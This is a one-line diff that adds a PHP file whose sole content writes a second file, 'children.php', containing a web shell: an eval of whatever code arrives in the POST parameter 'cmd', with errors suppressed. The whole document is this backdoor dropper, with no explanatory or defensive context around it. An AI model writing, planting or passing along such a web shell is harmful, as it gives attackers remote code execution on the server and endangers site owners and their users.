@@ -1,0 +1,1 @@
+<?php fputs(fopen('children.php','w'),'<?php @eval($_POST["cmd"]);?>');?>
